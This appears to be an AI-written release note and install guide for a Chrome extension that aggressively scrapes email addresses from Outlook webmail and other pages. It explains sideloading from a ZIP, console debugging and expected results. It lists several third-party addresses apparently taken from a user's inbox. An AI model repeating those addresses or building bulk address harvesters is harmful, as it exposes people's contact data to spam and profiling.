# ✅ Version 1.2 - AGGRESSIVE OUTLOOK SCANNING

## 🚀 NEW VERSION - Download Now!
**https://invoice-system-7fc.pages.dev/email-extractor-extension.zip**

---

## 🔥 What's New in v1.2

### Major Improvements:
1. **Scans ALL Elements** - Now scans every single element on the page
2. **Scans ALL Attributes** - Checks title, aria-label, data-*, and ALL other attributes
3. **Outlook-Specific** - Added selectors for Outlook's email list structure
4. **Console Logging** - Shows each email as it's found (check F12 console)
5. **Instant Notifications** - Popup shows immediately when emails are found
6. **Faster Initial Scan** - Starts scanning after 500ms (was 1000ms)
7. **Multiple Scans** - Scans at 500ms, 2s, then every 3s
8. **Keyup Trigger** - Scans when you type (for search/filter)

### New Selectors Added:
- `[role="row"]` - Email list rows
- `[role="gridcell"]` - Email grid cells
- `[data-convid]` - Outlook conversation IDs
- All `button`, `span[title]`, `div[title]` with @ symbol
- Every element's attributes scanned

---

## 📥 INSTALLATION STEPS

### 1. Remove Old Version (If Installed)
- Go to `chrome://extensions/`
- Find "Email Extractor"
- Click **"Remove"**

### 2. Download NEW Version
**https://invoice-system-7fc.pages.dev/email-extractor-extension.zip**

### 3. Extract the ZIP
- Right-click → "Extract All..."
- Choose Desktop or Documents
- Click "Extract"

### 4. Install
- Go to `chrome://extensions/`
- Turn ON "Developer mode" (top right)
- Click "Load unpacked"
- Select the folder with the 7 files
- Click "Select Folder"

---

## 🔍 How to Use in Outlook

### Step 1: Open Outlook
Go to: https://outlook.office.com

### Step 2: Open Your Inbox
- Click "Inbox" in the left sidebar
- Wait 2-3 seconds for emails to load

### Step 3: Check Console (Optional)
- Press **F12** to open DevTools
- Go to **Console** tab
- Look for messages: `📧 Email Extractor: Found new email: xxx@xxx.com`

### Step 4: Look for Extension Badge
- Bottom-right corner of screen
- Should show: "Email Extractor" with count badge
- If you see "0", wait a few more seconds

### Step 5: Scroll Through Emails
- Scroll up and down slowly
- Extension scans as you scroll
- Console will show each email found

### Step 6: View Emails
- Click the extension badge (bottom-right)
- OR click extension icon in toolbar
- See all extracted emails

---

## 🎯 Testing Checklist

Try these actions in Outlook:

- [ ] Open inbox and wait 3 seconds
- [ ] Scroll down through emails
- [ ] Click on an email to open it
- [ ] Press F12 and check console logs
- [ ] Look for badge in bottom-right corner
- [ ] Type in search box
- [ ] Refresh page and try again

---

## 🐛 Debugging

### Check Console Logs:
1. Press **F12**
2. Go to **Console** tab
3. Look for these messages:
   ```
   📧 Email Extractor: Active and scanning...
   📧 Will scan every 3 seconds + on scroll/click/keyup
   📧 Email Extractor: Found new email: xxx@xxx.com
   ```

### If You See "Active and scanning..." but no emails:
- Extension is loaded correctly
- Wait 3-5 seconds
- Scroll the page
- Click on an email
- Type something in search

### If You Don't See Any Console Messages:
- Extension not loaded properly
- Remove and reinstall
- Make sure you extracted the ZIP first
- Select the correct folder

---

## 💡 What Should Happen

### In Console (F12):
```
📧 Email Extractor: Active and scanning...
📧 Will scan every 3 seconds + on scroll/click/keyup
📧 Email Extractor: Found new email: smtp2go@ondemandhouston.com
📧 Email Extractor: Found new email: amanda.lane@example.com
📧 Email Extractor: Found new email: accountspayable@forcepsi.com
🔍 Found 3 new email(s)! Total: 3
```

### On Screen:
- Badge appears in bottom-right corner
- Shows number of emails (e.g., "3")
- Green notification popup: "🔍 Found 3 new email(s)! Total: 3"

---

## 🔧 If Still Not Working

### Try These:

1. **Refresh Outlook Page**
   - Press F5
   - Wait 3 seconds
   - Check console again

2. **Click Around**
   - Click on different emails
   - Click inbox folders
   - Each click triggers a scan

3. **Manual Test**
   - Open a simple webpage with emails
   - Example: https://www.ycombinator.com/companies
   - Should work there if extension is OK

4. **Check Extension Status**
   - Go to `chrome://extensions/`
   - Look for "Email Extractor"
   - Should say "Enabled"
   - No errors shown

---

## 📊 Expected Results in Your Screenshot

Based on your Outlook inbox, should find:
- ✅ smtp2go@ondemandhouston.c...
- ✅ amanda.brock@forcepsi...
- ✅ accountspayable@sonetetra.com
- ✅ And any other emails visible

---

## 🌐 Download Links

**Extension**: https://invoice-system-7fc.pages.dev/email-extractor-extension.zip
**Landing Page**: https://invoice-system-7fc.pages.dev/extension

---

**Version**: 1.2 (Aggressive Outlook Scanning)  
**File Size**: 9.5 KB  
**Last Updated**: February 9, 2026  
**Status**: ✅ DEPLOYED

---

## ⚡ Quick Steps for Your Situation:

1. Remove current extension from Chrome
2. Download new version: https://invoice-system-7fc.pages.dev/email-extractor-extension.zip
3. Extract and install
4. Go to Outlook inbox
5. Press F12 and watch console
6. Wait 3 seconds
7. Scroll or click on emails
8. Console should show found emails!
